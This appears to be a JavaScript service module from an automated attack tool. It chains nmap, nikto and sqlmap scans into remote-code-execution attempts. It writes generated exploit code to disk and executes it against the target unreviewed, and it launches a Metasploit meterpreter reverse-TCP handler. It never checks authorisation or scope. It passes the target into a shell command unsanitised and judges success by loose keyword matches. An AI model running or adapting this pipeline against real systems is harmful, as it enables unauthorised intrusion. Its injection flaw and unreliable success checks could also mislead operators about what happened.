const toolExecutor = require('./tools/tool-executor.service');
const toolRegistry = require('./tools/tool-registry.service');
const analyzer = require('./analyzer.service');
const exploitGenerator = require('./exploit/exploit-generator.service');
const { createDocument, createEdge } = require('./graph.service');
const { createScan, createVulnerability, createApplication } = require('../models/graph.models');

async function runReconnaissance(target) {
  try {
    console.log(`[Scanner] Starting reconnaissance on ${target}`);

    // Ensure nmap is available
    const nmapStatus = await toolRegistry.ensureToolAvailable('nmap');
    if (!nmapStatus.available && !nmapStatus.installed) {
      throw new Error('nmap not available and could not be installed');
    }

    // Run nmap scan
    const scanResult = await toolExecutor.executeNmap(target, {
      ports: '1-1000', // Initial scan of common ports
      serviceVersion: true,
    });

    // Parse results
    const parsed = await analyzer.analyzeOutput('nmap', scanResult.output || scanResult.stdout);

    // Store scan
    const scanDoc = createScan(target, 'reconnaissance', 'completed');
    const savedScan = await createDocument('scans', scanDoc);

    // Store application if web service found
    if (parsed.attackSurfaces && parsed.attackSurfaces.some(s => s.type === 'web_service')) {
      const appDoc = createApplication(target, target, 'Target application');
      const savedApp = await createDocument('applications', appDoc);
      
      if (savedScan && savedScan._id && savedApp && savedApp._id) {
        await createEdge('vulnerability_found_in', savedScan._id, savedApp._id);
      }
    }

    return {
      ...scanResult,
      parsed,
      scanId: savedScan?._id,
    };
  } catch (error) {
    console.error('Error in reconnaissance:', error);
    return {
      success: false,
      error: error.message,
    };
  }
}

async function runVulnerabilityScans(target, toolNames = []) {
  const results = [];

  try {
    // Default tools if none specified
    const tools = toolNames.length > 0 ? toolNames : ['nikto', 'sqlmap'];

    for (const toolName of tools) {
      // Ensure tool is available
      const toolStatus = await toolRegistry.ensureToolAvailable(toolName);
      
      if (!toolStatus.available && !toolStatus.installed) {
        console.log(`[Scanner] Skipping ${toolName} - not available`);
        continue;
      }

      // Execute tool based on type
      let scanResult;
      switch (toolName.toLowerCase()) {
        case 'nmap':
          scanResult = await toolExecutor.executeNmap(target, {
            ports: '1-65535',
            serviceVersion: true,
          });
          break;
        case 'nikto':
          scanResult = await toolExecutor.executeNikto(target);
          break;
        case 'sqlmap':
          // Extract URL from target or use as-is
          scanResult = await toolExecutor.executeSqlmap(target, {
            forms: true,
          });
          break;
        default:
          // Generic execution
          scanResult = await toolExecutor.executeTool(toolName, [target]);
      }

      if (scanResult.success || scanResult.output) {
        // Analyze output
        const analysis = await analyzer.analyzeOutput(toolName, scanResult.output || scanResult.stdout || '');
        
        results.push({
          tool: toolName,
          result: scanResult,
          analysis,
        });
      }
    }

    return results;
  } catch (error) {
    console.error('Error in vulnerability scans:', error);
    return results;
  }
}

async function attemptRCE(target, vulnerability) {
  try {
    console.log(`[Scanner] Attempting RCE via ${vulnerability.type}`);

    // Check for existing exploits
    const exploits = await require('./exploit/exploit-research.service').researchRCEExploits(target, vulnerability);
    
    if (exploits.exploits && exploits.exploits.length > 0) {
      // Try existing exploits first
      for (const exploit of exploits.exploits.slice(0, 3)) {
        // Download and execute exploit if possible
        console.log(`[Scanner] Trying exploit: ${exploit.title || exploit.url}`);
      }
    }

    // Generate new exploit
    const generatedExploit = await exploitGenerator.generateExploit(vulnerability, target, {
      language: 'python',
    });

    if (generatedExploit && generatedExploit.code) {
      // Execute generated exploit
      const exploitResult = await executeExploit(generatedExploit, target);
      
      if (exploitResult.success) {
        return {
          success: true,
          method: 'generated_exploit',
          exploit: generatedExploit,
          result: exploitResult,
        };
      }
    }

    // Try Metasploit if available
    const msfStatus = await toolRegistry.ensureToolAvailable('msfconsole');
    if (msfStatus.available) {
      const msfResult = await toolExecutor.executeMetasploit(
        'exploit/multi/handler',
        'python/meterpreter/reverse_tcp',
        {
          target,
          lhost: 'localhost', // Should be configurable
        }
      );

      if (msfResult.success || msfResult.stdout?.includes('session opened')) {
        return {
          success: true,
          method: 'metasploit',
          result: msfResult,
        };
      }
    }

    return {
      success: false,
      message: 'RCE attempt failed',
    };
  } catch (error) {
    console.error('Error attempting RCE:', error);
    return {
      success: false,
      error: error.message,
    };
  }
}

async function executeExploit(exploit, target) {
  try {
    const fs = require('fs-extra');
    const path = require('path');
    const { exec } = require('child_process');
    const { promisify } = require('util');
    const execAsync = promisify(exec);

    // Save exploit to file
    const exploitDir = path.join(process.env.WORK_DIR || './work', 'exploits');
    await fs.ensureDir(exploitDir);
    
    const extension = exploit.language === 'python' ? 'py' : 'sh';
    const exploitFile = path.join(exploitDir, `exploit_${Date.now()}.${extension}`);
    await fs.writeFile(exploitFile, exploit.code, 'utf-8');
    await fs.chmod(exploitFile, 0o755);

    // Execute exploit
    let command;
    if (exploit.language === 'python') {
      command = `python3 ${exploitFile} ${target}`;
    } else if (exploit.language === 'bash' || exploit.language === 'sh') {
      command = `bash ${exploitFile} ${target}`;
    } else {
      command = exploitFile;
    }

    try {
      const { stdout, stderr } = await execAsync(command, {
        timeout: 60000, // 1 minute
      });

      // Check for success indicators
      const successIndicators = [
        'shell',
        'command',
        'executed',
        'success',
        'connected',
      ];

      const output = (stdout + stderr).toLowerCase();
      const success = successIndicators.some(indicator => output.includes(indicator));

      return {
        success,
        stdout,
        stderr,
        output: stdout + stderr,
      };
    } catch (error) {
      return {
        success: false,
        error: error.message,
        stderr: error.stderr,
        stdout: error.stdout,
      };
    }
  } catch (error) {
    return {
      success: false,
      error: error.message,
    };
  }
}

async function runFullScan(target, goal = 'rce') {
  const scanResults = {
    reconnaissance: null,
    vulnerabilityScans: [],
    vulnerabilities: [],
    rceAttempts: [],
    rceAchieved: false,
  };

  try {
    // Phase 1: Reconnaissance
    scanResults.reconnaissance = await runReconnaissance(target);

    // Phase 2: Vulnerability Discovery
    const vulnScans = await runVulnerabilityScans(target);
    scanResults.vulnerabilityScans = vulnScans;

    // Extract vulnerabilities
    for (const scan of vulnScans) {
      if (scan.analysis && scan.analysis.vulnerabilities) {
        scanResults.vulnerabilities.push(...scan.analysis.vulnerabilities);
      }
    }

    // Phase 3: RCE Attempts (if goal is RCE)
    if (goal === 'rce' && scanResults.vulnerabilities.length > 0) {
      const rceOpportunities = scanResults.vulnerabilities.filter(v =>
        v.type.toLowerCase().includes('command') ||
        v.type.toLowerCase().includes('rce') ||
        v.type.toLowerCase().includes('file upload')
      );

      for (const vuln of rceOpportunities) {
        const rceAttempt = await attemptRCE(target, vuln);
        scanResults.rceAttempts.push(rceAttempt);
        
        if (rceAttempt.success) {
          scanResults.rceAchieved = true;
          break; // Stop on first successful RCE
        }
      }
    }

    return scanResults;
  } catch (error) {
    console.error('Error in full scan:', error);
    return {
      ...scanResults,
      error: error.message,
    };
  }
}

module.exports = {
  runReconnaissance,
  runVulnerabilityScans,
  attemptRCE,
  runFullScan,
  executeExploit,
};

